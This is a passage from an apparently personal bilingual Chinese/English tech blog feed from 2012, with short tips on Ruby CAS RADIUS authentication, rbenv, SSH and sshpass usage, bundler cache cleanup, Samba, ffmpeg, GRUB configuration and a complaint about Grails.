 12             
 13     begin   
 14       reply = req.authenticate(username, password, PUBLIC_KEY, auth_custom_attr)
 15       #reply example: {:code=&amp;gt;"Access-Accept", "Framed-Protocol"=&amp;gt;PPP, "Service-Type"=&amp;gt;Framed-User, "C
 16       Rails.logger.info "== Radiut reply : #{reply.inspect}"
 17       return reply[:code] == 'Access-Accept'
 18     rescue Exception =&amp;gt; e
 19       Rails.logger.error "== exception: #{e.inspect}"
 20       Rails.logger.error "== #{e.backtrace.join("\n")}"
 21       return false
 22     end
 23   end
 24 end

&lt;/pre&gt;
3.&amp;#160;
&lt;pre&gt;  1 require 'rubygems'
  2 require 'radiustar'
  3 require 'authentication_tool'
  4 require 'casserver/authenticators/base'
  5 
  6 # 定制的Radius 验证
  7 module CASServer
  8     module Authenticators
  9         class Radius &amp;lt;
 10             CASServer::Authenticators::Base
 11           def validate(credentials)
 12             read_standard_credentials(credentials)
 13             return false if @password.blank?
 14             return AuthenticationTool.authenticate_using_radiut(@username, @password)
 15           end
 16         end
 17     end
 18 end

&lt;/pre&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;p&gt;参考(refer to ) ：&lt;a href="http://www.iteye.com/topic/212170" target="_blank"&gt;http://www.iteye.com/topic/212170 &lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Tue, 18 Dec 2012 07:16:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/setting-up-ruby-cas-server</link>
    </item>
    <item>
      <title>rbenv的基本用法(basic usage about rbenv) </title>
      <description>&lt;p&gt;111跟RVM类似，RBENV提供了轻量级的RUBY切换方法。我们看一下：&lt;/p&gt;
&lt;p&gt;1. 安装RUBY： RVM自动帮你安装， RBENV需要你手动安装&lt;br /&gt;RVM: &amp;#160;&lt;br /&gt;$ rvm install 1.9.3&amp;#160;&lt;/p&gt;
&lt;p&gt;RBENV: &amp;#160; &amp;#160;( or use rbenv install )&amp;#160;&lt;br /&gt;$ ./configure --prefix=/opt/.rbenv/version/1.9.3-p327&lt;br /&gt;$ make &amp;amp; make install&lt;/p&gt;
&lt;p&gt;2. 显示本地的ruby&lt;br /&gt;$ rvm list -l &lt;br /&gt;$ rbenv local &lt;br /&gt;&lt;/p&gt;</description>
      <pubDate>Wed, 12 Dec 2012 01:46:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/basic-usage-of-rbenv</link>
    </item>
    <item>
      <title>RVM与 rbenv ( RVM and rbenv ) </title>
      <description>&lt;p&gt;参考(refert to )：&amp;#160; &lt;a href="http://jonathan-jackson.net/rvm-and-rbenv"&gt;http://jonathan-jackson.net/rvm-and-rbenv&lt;/a&gt;
&lt;/p&gt;&lt;p&gt;今天早上发现公司服务器上装的是RBENV，跟 RVM是一个类型的工具，切换不同版本的RUBY。所以搜索比较了一下两者的用法和优劣。&lt;/p&gt;</description>
      <pubDate>Wed, 12 Dec 2012 01:43:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rvm-and-rbenv</link>
    </item>
    <item>
      <title>SSH 相关（端口号，密码等等）  ( SSH related parameters ) </title>
      <description>&lt;p&gt;公司使用了特殊的SSH 端口号，我总容易弄错，所以把相关的信息贴在这里： ( our server in company uses a special port rather than usual 22 which always making me confused. &amp;#160;so I have to post related tips here )&amp;#160;&lt;/p&gt;
&lt;p&gt;1. scp 例子： &amp;#160;( upper case of "P")&lt;/p&gt;
&lt;p&gt;$&amp;#160;scp -P 22022 ./ruby-1.9.3-p327.tar.gz root@10.103.13.121:/root/&lt;/p&gt;
&lt;p&gt;2. ssh 例子：&lt;/p&gt;
&lt;p&gt;ssh -p 22022 10.103.13.121 -l root &amp;#160;( lower case of 'p')&lt;/p&gt;
&lt;p&gt;3. sshpass例子：&lt;/p&gt;
&lt;p&gt;sshpass -p 'your password here ' ssh -p 22022 10.103.13.121 -l root&lt;/p&gt;</description>
      <pubDate>Wed, 12 Dec 2012 01:19:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ssh-related-parameters-in-comands</link>
    </item>
    <item>
      <title>bundle 遇到问题的终极解决办法 ( how to solve strange bundle problems )</title>
      <description>&lt;p&gt;今天遇到一个很奇怪的bundler 问题，某个 gem安装明明是正确的，就是运行起来提示说找不到gem . &amp;#160; ( today I met a very strange problem about bundle that it complains no corresponding gem found while actually all the gems are installed successfully ) &lt;/p&gt;
&lt;p&gt;google了一下，发现了大家推荐的这个BUNDLE终极问题解决办法 ( after googled around I found this final useful post) ：&amp;#160; &amp;lt; a href ='https://github.com/carlhuda/bundler/blob/master/ISSUES.md' target="_blank"&amp;gt;https://github.com/carlhuda/bundler/blob/master/ISSUES.md&lt;/p&gt;
&lt;pre&gt;# remove user-specific gems and git repos
rm -rf ~/.bundle/ ~/.gem/bundler/ ~/.gems/cache/bundler/

# remove system-wide git repos and git checkouts
rm -rf $GEM_HOME/bundler/ $GEM_HOME/cache/bundler/

# remove project-specific settings and git repos
rm -rf .bundle/

# remove project-specific cached .gem files
rm -rf vendor/cache/

# remove the saved resolve of the Gemfile
rm -rf Gemfile.lock

# uninstall the rubygems-bundler and open_gem gems
rvm gemset use global # if using rvm
gem uninstall rubygems-bundler open_gem

# try to install one more time
bundle install
&lt;/pre&gt;
&lt;p&gt;如果上述办法还不行，请看： ( if the approach above doesn't help, please try this: ) refer to &lt;a href="http://stackoverflow.com/questions/5007773/installing-gems-with-bundler-big-problem"&gt;http://stackoverflow.com/questions/5007773/installing-gems-with-bundler-big-problem&lt;/a&gt;
&lt;/p&gt;
&lt;pre&gt;$ bundle pack
$ bundle install --path vendor/cache
&lt;/pre&gt;</description>
      <pubDate>Sun, 09 Dec 2012 06:01:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/how-to-solve-strange-bundle-problems</link>
    </item>
    <item>
      <title>commandline是王道。(using command line , not software center) </title>
      <description>&lt;p&gt;今天安装chrome，下载了.deb包，可惜怎么样都说打开失败。 ( today I was stucked when installing the chrome deb file)&amp;#160;&lt;/p&gt;

&lt;p&gt;结果使用命令行。  $sudo dpkg -i google-chrome-stable_current_i386.deb 
马上找到问题所在了： ( but when switched to command line, the problem exposed immediately : )&amp;#160;&lt;/p&gt;
&lt;pre&gt;dpkg: dependency problems prevent configuration of google-chrome-stable:
 google-chrome-stable depends on libnss3-1d (&amp;gt;= 3.12.3); however:
  Package libnss3-1d is not installed.
 google-chrome-stable depends on libxss1; however:
  Package libxss1 is not installed.
&lt;/pre&gt;
&lt;p&gt;

于是 &amp;#160;( so ... )&amp;#160;&lt;/p&gt;
&lt;p&gt;$ sudo aptitude install libnss3-1d libxss1&amp;#160;&lt;/p&gt;
&lt;p&gt;&amp;#160;然后 &amp;#160;( and then ... )&amp;#160;&lt;/p&gt;
&lt;p&gt;$sudo dpkg -i google-chrome-stable_current_i386.deb&amp;#160;&lt;/p&gt;
&lt;p&gt;&amp;#160;搞定！！！  chrome 23! &amp;#160; (done! hi chrome 23! )&amp;#160;&lt;/p&gt;</description>
      <pubDate>Fri, 07 Dec 2012 03:03:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/using-command-line-which-is-super-power</link>
    </item>
    <item>
      <title>UBUNTU访问 WINDOWS 资源 ( accessing windows resources using linux ) </title>
      <description>&lt;div&gt;参考：&lt;a href="http://wiki.ubuntu.com.cn/Samba#.E5.AE.89.E8.A3.85Samba" target="_blank"&gt;http://wiki.ubuntu.com.cn/&lt;wbr /&gt;Samba#.E5.AE.89.E8.A3.85Samba&lt;/a&gt;
&lt;br /&gt;&lt;br /&gt;&lt;p&gt;1. sudo apt-get install samba&lt;/p&gt;
&lt;br /&gt;smbclient //对方IP/那个共享文件夹 －U 你的smb帐号，就是那个new&lt;br /&gt;&lt;br /&gt;
例如：smbclient //&lt;a href="http://218.196.119.86/%E7%94%B5%E5%BD%B1" target="_blank"&gt;218.196.119.86/电影&lt;/a&gt; -u new password:输入smb用户new的密码&lt;br /&gt;&lt;br /&gt;回车就可以用，用命令get下载文件，用put上传文件。&lt;br /&gt;&lt;br /&gt;（记得所有的字符串都不要有"\", 要使用"/"代替，否则你就会看到：&lt;br /&gt;
&lt;br /&gt;Not enough '\' characters in service &amp;#160;这个错误） &lt;br /&gt;例如： 正确的： smbclient --user=1verge/shensiwei -L 10.10.0.70&lt;br /&gt;错误的： &amp;#160;smbclient --user=1verge\shensiwei -L 10.10.0.70&lt;div class="yj6qo"&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;div id=":11o"&gt;&lt;p&gt;2. 上面方法的缺点就是： 只能查看列表，无法进入到 上传，下载的模式中。例如：

&lt;/p&gt;
&lt;pre&gt;smbclient --user=1verge/shensiwei --iocharset=gb2312 -L '10.10.0.70'
Enter 1verge/shensiwei's password:
Domain=[1VERGE] OS=[Windows Server (R) 2008 Enterprise 6001 Service Pack 1] Server=[Windows Server (R) 2008 Enterprise 6.0]
    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      远程管理
    C$              Disk      默认共享
    D$              Disk      默认共享
    FB$             Disk     
    G$              Disk      默认共享
    H$              Disk      默认共享
    HR_Team         Disk     
    IPC$            IPC       远程 IPC
    IT文档        Disk     
    Marketing       Disk     
    public          Disk     
    upload          Disk     
    临时存储    Disk     
session request to 10.10.0.70 failed (Called name not present)
session request to 10 failed (Called name not present)
session request to *SMBSERVER failed (Called name not present)
NetBIOS over TCP disabled -- no workgroup available
&lt;/pre&gt;
&lt;p&gt;所以，需要加上文件夹的名字使之完整( 使 server这个参数），同时不要使用-L 这个参数。 例如：&lt;/p&gt;
&lt;p&gt;smbclient --user=1verge/shensiwei //&lt;a href="http://10.10.0.70/IT" target="_blank"&gt;10.10.0.70/IT&lt;/a&gt;文档&lt;/p&gt;
&lt;p&gt;
来使用跟FTP 差不多的方式来 GET， PUT 各种文件&lt;/p&gt;
&lt;/div&gt;</description>
      <pubDate>Fri, 07 Dec 2012 02:58:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/accessing-windows-resources-using-linux</link>
    </item>
    <item>
      <title>命令行是王道2：UBUNTU11 安装打印机 ( using command line install the printer ) </title>
      <description>&lt;p&gt;&lt;a href="http://www.garron.me/linux/firewalld-is-not-running-ubuntu-printer.html"&gt;http://www.garron.me/linux/firewalld-is-not-running-ubuntu-printer.html&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt; 昨天安装打印机时，ubuntu提示： (when I was trying to setup printer under ubuntu, it complains: )  &lt;/p&gt;
&lt;p&gt;Firewalld is not running: Network printer detection needs... "Error in Ubuntu"&lt;/p&gt;
&lt;p&gt;解决办法是使用 命令行来搞定： ( You will have to find a workaround, and one possible one is to open a window terminal and run: ) &lt;/p&gt;
&lt;pre&gt;$ system-config-printer&lt;/pre&gt;
&lt;p&gt; 命令行就是给力啊！！！！ ( command line is the superpower ) &lt;/p&gt;</description>
      <pubDate>Fri, 07 Dec 2012 02:54:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/using-command-line-install-the-printer</link>
    </item>
    <item>
      <title>对RUBY 几个版本的测试( performance test for severial rubys ) </title>
      <description>&lt;p&gt;前几天看到这个文章：&amp;#160;&lt;a href="http://inosin.iteye.com/blog/1740633" title="http://inosin.iteye.com/blog/1740633" target="_blank"&gt;http://inosin.iteye.com/blog/1740633&lt;/a&gt;&amp;#160;以及robbin的微博，说道更换RUBY PATCH 之后带来的性能100%提升，我打算在自己的项目中实际测试一下。 &amp;#160; 不仅仅是跑 $rake routes, 我要跑遍所有的 test case, 这样更有代表性。 &amp;#160;( several days ago I saw a post mentioning that using RVM + falcon speed up 100% of ruby performance, so I want to have a try on my code, not only the "$rake routes", but also the "$rpsec spec" -- run all the test cases, so that I know how much benifits I can get in the real world. )&amp;#160;&lt;/p&gt;
&lt;p&gt;( gc var set:  export RUBY_GC_MALLOC_LIMIT=60000000 
export RUBY_FREE_MIN=200000   ) &lt;/p&gt;
&lt;p&gt;1. &amp;#160;Official Ruby 1.9.3: &amp;#160;(standalone version, &amp;#160;NOT rvm )&lt;/p&gt;
&lt;pre&gt;$ rake spec -I . :   ( ---- average time: 22.42 s  ) 
time ellapse: 22.185478835
time ellapse: 22.672805472
time ellapse: 22.449144903
time ellapse: 22.375249893
time ellapse: 22.42328384

with GC var set:
time ellapse: 19.656764126
time ellapse: 19.567634556
time ellapse: 19.731576858
time ellapse: 19.696367543
time ellapse: 19.699878242

$ rake routes:   ( average time:  4.10 s ) 
time ellapse: 4.073651412
time ellapse: 4.068737774
time ellapse: 4.095116022
time ellapse: 4.136936819
time ellapse: 4.119734137

with GC var set: 
time ellapse: 3.79018815
time ellapse: 3.862510267
time ellapse: 3.830122943
time ellapse: 2.972089698
&lt;/pre&gt;
&lt;p&gt;2. RVM ruby 1.9.3&lt;/p&gt;
&lt;pre&gt;$ rake spec -I . :   ( ---- average time: 20.73 s , 7.5% up!  ) 
time ellapse: 20.850909014
time ellapse: 20.715897765
time ellapse: 20.605630532
time ellapse: 20.674324368
time ellapse: 20.830513131

with GC var set: 
time ellapse: 19.425704352
time ellapse: 19.201540791
time ellapse: 19.504168411
time ellapse: 19.210046565
time ellapse: 19.162727488

$ rake routes:   ( average time:  2.67 s , 65% up! ) 
time ellapse: 2.668698989    
time ellapse: 2.647600586
time ellapse: 2.666264516
time ellapse: 2.688923067
time ellapse: 2.661307934
with GC var set:    
time ellapse: 2.43559832
time ellapse: 2.442118418
time ellapse: 2.453796224
time ellapse: 2.463688373
time ellapse: 2.436229889
&lt;/pre&gt;
&lt;p&gt;how to setup ruby with&amp;amp;without RVM:&amp;#160;&lt;/p&gt;
&lt;p&gt;参考：http://inosin.iteye.com/blog/1740633&lt;/p&gt;
&lt;p&gt;1. 安装 官方的ruby  （非 RVM）&lt;br /&gt;  1. wget ....  configure ... make ... make install&lt;/p&gt;
&lt;p&gt;2. RVM ruby &lt;br /&gt;  2.1 install rvm&lt;br /&gt;  2.2 rvm requirement.... install...&lt;/p&gt;
&lt;p&gt;   2.3. Setup with RVM:&lt;/p&gt;
&lt;p&gt;rvm get head&lt;br /&gt;# open new shell&lt;br /&gt;rvm reinstall 1.9.3 --patch falcon&lt;/p&gt;</description>
      <pubDate>Fri, 07 Dec 2012 02:32:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/performance-test-for-severial-rubys</link>
    </item>
    <item>
      <title>从ruby 1.8 转移到 1.9之后的rspec用法变化 （rspec usage changes from ruby1.8 to ruby1.9)</title>
      <description>&lt;p&gt;in ruby 1.8, we use: $ rspec spec&lt;/p&gt;
&lt;p&gt;however, in 1.9 , we have to specify the current path, e.g. $ rspec spec -I . &amp;#160; &amp;#160;&lt;/p&gt;
&lt;p&gt;more refer to :&amp;#160; &lt;a href="http://stackoverflow.com/questions/11376718/require-lib-in-rspec-with-ruby-1-9-2-brings-no-such-file-to-load"&gt;http://stackoverflow.com/questions/11376718/require-lib-in-rspec-with-ruby-1-9-2-brings-no-such-file-to-load&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Fri, 07 Dec 2012 02:29:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rspec-usage-changed-from-ruby1-8-to-ruby1-9</link>
    </item>
    <item>
      <title>ubuntu 11 使用经典页面Gnome（ use classic Gnome2 in ubuntu11 natty) </title>
      <description>&lt;p&gt;参考文章：(refer to ) &amp;#160;http://ubuntuguide.net/ubuntu-11-10-oneiric-login-to-classic-gnome2-and-gnome3gnome-shell&lt;/p&gt;
&lt;p&gt;其实这个问题本来很好解决，在LOGIN 的时候选择 "classic" 就可以了。 (it's a very easy question that could be solved by simply choose the "Classic ... " option in the login window )&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbB1sHOgZmIjQyMDEyLzEyLzAyLzA2XzQwXzA2XzUzNV9uYXR0eV9jbGFzc2ljX2VkaXQxLnBuZ1sIOgZwOgp0aHVtYiINNDUweDQ1MD4/natty_classic_edit1.png" title="Natty Classic Edit1" alt="Natty Classic Edit1" rel="450x450" width="450" height="337" /&gt;&lt;/p&gt;
&lt;p&gt;但是我的机器情况有点儿特殊，看不到这个选项，而且登录页面也有所不同。所以。。。需要我：(but I met a very strange case that I could not find the option in my login screen, so I have to do a little more: )&amp;#160;&lt;/p&gt;
&lt;p&gt;$ sudo apt-get install gnome-session-fallback &lt;/p&gt;
&lt;p&gt;退出登录，然后你就可以找到这个选项了。( then logout, you will find this option. )&amp;#160;&lt;/p&gt;
&lt;p&gt;向可怕的新页面说88，继续享受得心应手的经典界面吧！ ( enjoy my classic interface! &amp;#160;say good bye to the awful screen)&amp;#160;&lt;/p&gt; 

</description>
      <pubDate>Sat, 01 Dec 2012 22:37:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/use-classic-gnome2-in-ubuntu11-instead-of-natty</link>
    </item>
    <item>
      <title>LINUX下视频的录制和转码 ( video conversion and recording under linux )</title>
      <description>&lt;p&gt;1. 录制，使用  desktop recorder. &lt;br /&gt;可以选择录制视频的范围和大小。&lt;br /&gt;建议选择 "select window", 然后点击要记录的窗口，&lt;br /&gt;会自动的选中。&lt;/p&gt;
&lt;p&gt;然后记得点击 advanced 标签页，设置 frames per second. 我选择了5FPS，一般24足够用了。&lt;/p&gt;
&lt;p&gt; 选择号之后点击record就可以了&lt;/p&gt;
&lt;p&gt;2. 录制结束，鼠标邮件点击recorder的图标（此时一般是红色放框，在桌面右下角），点击 STOP。然后会出现保存视频中的提示框。记得这个时候绝对不要取消。否则 就白录了。如下图&lt;br /&gt;&lt;img src="/system/images/BAhbB1sHOgZmIi0yMDEyLzExLzIyLzE3XzI4XzUzXzk2OV9zYXZpbmdfdmlkZW8uanBnWwg6BnA6CnRodW1iIg00NTB4NDUwPg/saving_video.jpg" title="Saving Video" alt="Saving Video" rel="450x450" width="340" height="210" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;3.  保存后的文件格式是 ogv.  我们一般需要把它进行转码（成mp4  或 avi等高清晰度的视频），这个时候要使用 ffmpeg 这个工具。&lt;br /&gt;安装参考： http://www.techheadz.co.uk/224.html&lt;/p&gt;
&lt;p&gt;sudo apt-get install ffmpeg&lt;/p&gt;
&lt;p&gt;4. 安装好之后， $ ffmpeg -i &amp;lt;被转换的文件&amp;gt; -b &amp;lt;需要用的码率&amp;gt;  target.mp4&lt;br /&gt;其中，你可以先运行$ ffmpeg -i &amp;lt;被转换文件&amp;gt; target.mp4&lt;br /&gt;这个时候就可以看到 原始文件的bitrate.  如图，是425KB，&lt;br /&gt;然后马上ctrl + c, &lt;br /&gt;再次运行  $ ffmpeg -i &amp;lt;被转换的文件&amp;gt; -b &amp;lt;需要用的码率&amp;gt;  target.mp4&lt;br /&gt;保证输入用的码率大于原始码率就可以了。&lt;/p&gt;
&lt;p&gt;或者 $ ffmpeg -i &amp;lt;input.file&amp;gt; -c:v libx264 &amp;lt;out.file&amp;gt; (这个更加简单）&lt;br /&gt;&lt;img src="/system/images/BAhbB1sHOgZmIjAyMDEyLzExLzIyLzE3XzI5XzMwXzk2NF9jb252ZXJ0X2NvbW1hbmQuanBnWwg6BnA6CnRodW1iIg00NTB4NDUwPg/convert_command.jpg" title="Convert Command" alt="Convert Command" rel="450x450" width="450" height="153" /&gt;&lt;/p&gt;
&lt;p&gt;5. example command:&amp;#160;&lt;/p&gt;
&lt;pre&gt;$ ffmpeg -i inputvery_big.mp4 -c:v libx264 out_smaller.mp4
$ ffmpeg  -i VID_20140616_083939.mp4 -acodec copy ma_1.mp4
$ ffmpeg -i selenium_for_bap.ogv -b 1200k selenium_for_bap.mp4
$ ffmpeg  -i walking_kongfu.DAT -vf scale=1024:-1 -acodec copy walking_gongfu.mp4
$ ffmpeg -i walking_gongfu.mp4 -acodec copy -ss 00:15:25 -t 00:01:00 hexingbu1.mp4 &amp;#160; # split video, from 00:15:25 to 00:16:25
&lt;/pre&gt;
&lt;p&gt;see:&amp;#160; &lt;a href="http://www.siwei.me/blog/posts/recording-and-converting-video-under-linux"&gt;http://www.siwei.me/blog/posts/recording-and-converting-video-under-linux&lt;/a&gt; &lt;/p&gt;</description>
      <pubDate>Thu, 22 Nov 2012 09:27:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/video-conversion-and-recording-under-linux</link>
    </item>
    <item>
      <title>UBUNTU配置grub （config the grub menu)</title>
      <description>&lt;p&gt;还是记录一下吧。。。第三次做这件事了。 ( I record this as a blog because I am doing the same thing for the 3rd time)&lt;/p&gt;
&lt;p&gt;每次升级完UBUNTU，GRUB菜单就会自动把windows放在最后一项。妈妈就会抱怨说启动太复杂，一堆英文看不明白。 (everytime after I install/updated a new UBUNTU OS, my mom would complain that she can't login Windows, and she doesn't know the English characters on the screen)&lt;/p&gt;
&lt;p&gt;解决办法就是赶紧修改GRUB菜单。( the solution is to change the GRUB menu )&amp;#160;&lt;/p&gt;
&lt;p&gt;1. &amp;#160;vim /etc/default/grub&amp;#160;&lt;/p&gt;
&lt;p&gt;GRUB_GFXMODE=1920x1080 &amp;#160; # 如果显示不出GRUB 菜单的话，就修改它的分辨率 ( change the resolution if GRUB can't displayed)&lt;/p&gt;
&lt;p&gt;1. vim /boot/grub/grub.cfg &lt;/p&gt;
&lt;p&gt; 把: 
&lt;/p&gt;
&lt;pre&gt;161 ### BEGIN /etc/grub.d/30_os-prober ###
162 menuentry "Microsoft Windows XP Professional (on /dev/sda1)" --class windows --class os {
163     insmod part_msdos
164     insmod ntfs
165     set root='(/dev/sda,msdos1)'
166     search --no-floppy --fs-uuid --set=root AC60CA8160CA522E
167     drivemap -s (hd0) ${root}
168     chainloader +1
169 }
&lt;/pre&gt;
&lt;p&gt;
放在 其他 "menuentry" 的前面。 &amp;#160;( put the code segment above as the first "menuetry")&amp;#160;&lt;/p&gt;</description>
      <pubDate>Wed, 21 Nov 2012 23:03:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/config-ubuntu-grub-menu</link>
    </item>
    <item>
      <title>三种Ruby论坛的比较( comparasion for 3 ruby forums )</title>
      <description>&lt;p&gt;最近在考虑是不是要做个论坛，因为有好几个项目需要。但是动手之前，还是先看看有没有现成的轮子。 论坛按理说应该是最常见的应用。比如大名鼎鼎的 JIVE (JAVA 论坛），那性能叫一个惊人（使用了各种cache 等优化） 。( I need a forum application for my projects, but before writing my own, I plan to seek for an open sourced Ruby forum which should be very commonly used application and many candidates. Recall the year 2006, when I first time dive into the open source project, the famous JIVE (java forum) impressed me by its extremely high performance  ) &lt;/p&gt;
&lt;p&gt;google了一下， 找到三个开源的RUBY论坛： ( &lt;a href="http://www.quora.com/What-is-the-most-mature-forum-software-built-in-Ruby-on-Rails"&gt;http://www.quora.com/What-is-the-most-mature-forum-software-built-in-Ruby-on-Rails&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;1. beast (Rails 2.3.x ),&amp;#160; altered beast (Rails3.x )  ( https://github.com/stiff/altered_beast ) &lt;/p&gt;
&lt;p&gt;2. forem (Rails3 ), 据说是最好的Ruby 论坛 (said to be the best one) &lt;/p&gt;
&lt;p&gt;3. rborad. 据说也不错。(sounds good) &lt;/p&gt;
&lt;p&gt;结果如下：&lt;/p&gt;
&lt;p&gt;1.&lt;br /&gt;&lt;img rel="450x450" alt="Beast Looking" title="Beast Looking" src="/system/images/BAhbB1sHOgZmIi0yMDEyLzEwLzIzLzA5XzUwXzI4XzU4X2JlYXN0X2xvb2tpbmcucG5nWwg6BnA6CnRodW1iIg00NTB4NDUwPg/beast_looking.png" height="182" width="450" /&gt;&lt;br /&gt;altered Beast 是一个独立的forum. 如果你不用跟其他系统相结合，那么就用它吧！&amp;#160; 它有现成的皮肤，看起来似乎不错。不过不知道以后改版的话是否很麻烦。 ( altered beast is a standalone system . It's really a good choice if you don't need it to be a "plugin" or something similar and integrate it to existing system. It has its own outlooking&amp;amp;skin. )&amp;#160;&lt;/p&gt;
&lt;p&gt;缺点：一年没更新了。( not updated in this year) &lt;/p&gt;
&lt;p&gt;2.&amp;#160; forem. 非常棒，各种插件都是最流行最新颖的。作者也是个RUBY大牛。这个系统是一个插件，需要跟现有的系统进行集成，而且做成了一个GEM的形式。如果你没有现成的系统的话，就用不了。看你的需求了。 另外，前台的皮肤被剥离出来，做为一个独立的gem。如果你需要一个论坛插件，集成到现有系统当中，而且定制页面，那么forem是你的第一选择。 ( forem is awesome, it uses many of the cool and fancy, popular gems. the author is a top Ruby programmer.&amp;#160; Forem is not a standalone application, but a rubygem, which need to be used as a plugin/module for existing system. and its outlooking is highly customizable/flexible.&amp;#160; If you want your existing application have forum supported and the outlooking customized, then Forem is your first choice! ) &lt;/p&gt;
&lt;p&gt;3. rboard:&amp;#160; 它的代码已经看不到了。官方站点只有一句话：rBoard曾经是非常棒的RUBY论坛，但是现在它被 Forem 取代了。 看起来很苍凉啊。( its source code is gone, there's only 1 README file left, saying:&amp;#160; rboard was once a kick-ass forum, but now replaced by Forem... ) &lt;/p&gt;</description>
      <pubDate>Tue, 23 Oct 2012 01:04:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/comparasion-for-ruby-forums</link>
    </item>
    <item>
      <title>我的特殊号码又来了。(My special Number...) </title>
      <description>&lt;p&gt;&lt;img src="/system/images/BAhbB1sHOgZmIiUyMDEyLzEwLzIyLzA1XzAwXzU2XzYxMl8yMjIyLlBOR1sIOgZwOgp0aHVtYiINNDUweDQ1MD4/2222.PNG" title="2222" alt="2222" rel="450x450" width="450" height="112" /&gt;&lt;/p&gt;
&lt;p&gt;stackoverflow, 2222 ... 特2.。。 ( my score on stack overflow... &amp;#160;number"2" in Chinese means silly, foolish... ^_^ )&lt;/p&gt;</description>
      <pubDate>Sun, 21 Oct 2012 21:00:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/my-special-number</link>
    </item>
    <item>
      <title>很有用的命令： apt-get build-dep some_name (very useful command: apt-get build-dep) </title>
      <description>&lt;p&gt;今早，我在给一个新系统ubuntu安装nginx时，遇到了几个依赖包没有解决的问题。发现这个命令很好用：&lt;/p&gt;
&lt;p&gt;$ sudo apt-get build-dep nginx&lt;/p&gt;
&lt;p&gt;它会自动给你安装所有的依赖包。省的一个一个去找了。帅！&lt;/p&gt;</description>
      <pubDate>Thu, 18 Oct 2012 22:44:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ubuntu-build-dep-command</link>
    </item>
    <item>
      <title>Grails 吐槽  ( complains about Grails) </title>
      <description>&lt;p&gt;1. 不如Ruby 直观。语言比较拖拽，繁琐，估计是受了java的影响。例如，按照官方文档： ( not as expressive as Ruby.&amp;#160;&amp;#160; maybe effected by Java, not as simple as Ruby. e.g. the query below is copied from its official document: ) &lt;/p&gt;
&lt;pre&gt;// Dan brown's first book
Book.find("from Book as b where b.author='Dan Brown'")

// with a positional parameter Book.find("from Book as b where b.author=?", ['Dan Brown'])

// with a named parameter Book.find("from Book as b where b.author=:author", [author: 'Dan Brown'])

// use the query cache Book.find("from Book as b where b.author='Dan Brown'", [cache: true]) Book.find("from Book as b where b.author=:author", [author: 'Dan Brown'], [cache: true])

// query by example def example = new Book(author: "Dan Brown") Book.find(example)

// Using where criteria (since Grails 2.0) Person p = Person.find { firstName == "Bart" }
&lt;/pre&gt;
&lt;p&gt;
你可以很容易的写出 Rails这样的代码吗？  ( Can you easily implement the Rails code below using Grails ? )&lt;/p&gt;
&lt;pre&gt;book = Book.where("name = 'Jim'").last()    
book = Book.last(:condition =&amp;gt; "name = 'Jim'" )
&lt;/pre&gt;

&lt;p&gt;2. 该约定的时候，允许不约定的情况存在。 例如，今天发现个情况：&amp;#160;&amp;#160; ( it allows the not-obey-convention cases which should obey the convention. e.g. I found this code written by others: )&lt;/p&gt;
&lt;pre&gt;// grails/domain/yourpackage/Book.groovy 
class Book {
  // this is a domain class
}
// still in this file
class Person {
  // this is NOT a domain class, just an POJO
}
&lt;/pre&gt;
&lt;p&gt;按照约定，Person必须是个Domain model, 因为它放在了 domain 目录里。但是实际上，它由于没有自己对应的 Person.groovy文件，（寄居在了Book.groovy 中）， Grails 又不会认定它是个Domain.&amp;#160; ( Following the coding convention, Person should be a "Domain model" and thus should exist in a separated file named "Person.groovy". But actually it is written in Book.groovy file, so Grails won't recognize it as a Domain class. )&lt;/p&gt;
&lt;p&gt;相比之下， Rails 用显示代码声明的方式更好：&amp;#160; (Comparing to the case above, Rails' specific-declaration approach-- "&amp;lt; ActiveRecord::Base" is better )&lt;/p&gt;
&lt;pre&gt;# persistent object
class Device &amp;lt; ActiveRecord::Base
end
# regular object
class IAmNotPersistent
end&lt;/pre&gt;
&lt;p&gt;3. 速度太慢。 比如， Rails console, Rails Unit test:&amp;#160; 新机器2秒，06年老机器10秒也启动了。&amp;#160; 但是Grails居然要等个1分钟，而且最奇葩的是，出来的居然是 java GUI. &amp;gt;_&amp;lt;&amp;#160;&amp;#160; 难道 Grails console == Swing/swt GUI ?&amp;#160;&amp;#160; ( too slow. when running Rails console, 10 seconds is enough for a 2006 made computer.&amp;#160; but for Grails, I have to wait for 60 seconds!!! and even stranger thing is that finally I got a java "GUI"!!!&amp;#160; Could it be that "grails console" results in a Swing GUI? oh my god...)&lt;/p&gt;
&lt;p&gt;4. Bug 多多。例如， 我要在Rails 中显示某个图片，可以这样做&amp;#160;&amp;#160; ( too many bugs. e.g. I want to display a &amp;lt;img&amp;gt; element, I have many approaches: ) &lt;/p&gt;
&lt;p&gt;&amp;lt;%= image_path src='some_file' %&amp;gt;&lt;/p&gt;
&lt;p&gt;也可以这样做 (I can also use raw HTML) ：&amp;#160; &amp;lt;img src='/images/some_file' /&amp;gt;&amp;#160; ( some_file 放在 public/images目录下) ( some_file is put in public/images) &lt;/p&gt;
&lt;p&gt;可以是个 soft link&amp;#160; (and the src could be a soft link ) &lt;/p&gt;
